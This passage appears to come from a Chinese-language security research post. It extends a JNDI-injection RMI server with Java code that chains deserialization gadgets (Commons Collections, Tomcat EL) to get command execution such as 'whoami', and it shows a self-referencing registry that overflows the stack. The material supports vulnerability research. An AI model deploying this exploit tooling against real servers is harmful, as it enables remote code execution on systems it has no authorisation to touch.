                }
                //将我们的构造的execAll方法加到判断中
                else if (reference.startsWith("BypassTestAll")){
                    System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference for BypassTestAll.");
                    Reflections.setFieldValue(rw, "wrappee", execAll());
                }
                else {
                    System.out.println(
                            String.format(
                                    getLocalTime() + " [RMISERVER]  >> Sending remote classloading stub targeting %s",
                                    new URL(cpstring + reference.concat(".class"))));
                    Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", reference, turl.toString()));
                }
                Field refF = RemoteObject.class.getDeclaredField("ref");
                refF.setAccessible(true);
                refF.set(rw, new UnicastServerRef(12345));
                oos.writeObject(rw);
                oos.flush();
                out.flush();
            }
            return true;
        }
由于`util.Mapper#references`中包含了引用关系，所以这里也需要做下更改。
    static {
    ...
       references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"BypassTestAll");
    instructions.put("BypassTestAll","Build in "+ withColor("JDK - (BYPASSAll by @藏青)",ANSI_RED) +" whose test All Bypass Payload");
    }
当然我们也可以把之前分析的一些利用链也加进去，但是这并不是我们本片文章的重点，就不分析了。添加并启动后，可以看到我们我们添加的利用链地址。
在tomcat中请求我们创建的`registry`会将所有的利用链跑一遍，如果利用失败则会导致异常进入下一个利用链，直到跑成功获取对象并返回。
我们也可以从server端进行验证，因为我这里使用的tomcat8所以跑到el表达式后利用成功并返回。
#### 栈溢出
忽然想到如果我们在引用中的地址也是`RegistryContextFactory`那不就会导致递归的lookup查询，是否会产生什么问题。服务端代码如下：
    Registry registry = LocateRegistry.createRegistry(1099);
            Reference ref = new Reference("javax.sql.DataSource","com.sun.jndi.rmi.registry.RegistryContextFactory",null);
            ref.add(new StringRefAddr("URL","rmi://127.0.0.1:1099/Foo"));
            ReferenceWrapper wrapper = new ReferenceWrapper(ref);
            registry.bind("Foo", wrapper);
经过测试递归查询会触发tomcat的栈溢出异常，但是并不会对程序的使用产生影响。
### LdapCtxFactory
`LdapCtxFactory`和`RegistryContextFactory`相对应，具体的过程不分析了，最终是通过`LdapCtxFactory#getUsingURL`来执行，但是只会获取到`DirContext`并没有调用Lookup方法，所以似乎不能利用。
    private static DirContext getUsingURL(String var0, Hashtable var1) throws NamingException {
            Object var2 = null;
            LdapURL var3 = new LdapURL(var0);
            String var4 = var3.getDN();
            String var5 = var3.getHost();
            int var6 = var3.getPort();
            String var8 = null;
            String[] var7;
            if (var5 == null && var6 == -1 && var4 != null && (var8 = ServiceLocator.mapDnToDomainName(var4)) != null && (var7 = ServiceLocator.getLdapService(var8, var1)) != null) {
                String var9 = var3.getScheme() + "://";
                String[] var10 = new String[var7.length];
                String var11 = var3.getQuery();
                String var12 = var3.getPath() + (var11 != null ? var11 : "");
                for(int var13 = 0; var13  payload = (ObjectPayload) clazz.newInstance();
            final Object objBefore = payload.getObject("whoami", "exec_global");
            return objBefore;
        }
## 总结
虽然这次的小发现对于JNDI漏洞的利用来说可能有些画蛇添足，通过这几天的研究也发现了自己对RMI请求理解上的不足，最后对这种利用方式做一个总结。
  * 由于我们要传入一个ObjectFactory类名，所以需要一个Reference对象，但是JDK自带的只有`LinkRef`，不能传递ObjectFactory的类名，所以这里还是使用了tomcat中的`ResourceRef`,所以还是有些依赖Tomcat。
  * 由于`LdapCtxFactory`最终没有调用Lookup方法，因此目前只能通过RMI协议来进行自动化检测
  * 由于`CC1`,`CC3`,`CC7`无法通过返回的异常类型判断是否存在，所以不能检测这几条链。目前我只测了CC链，其他类型的利用链是否有异常未测试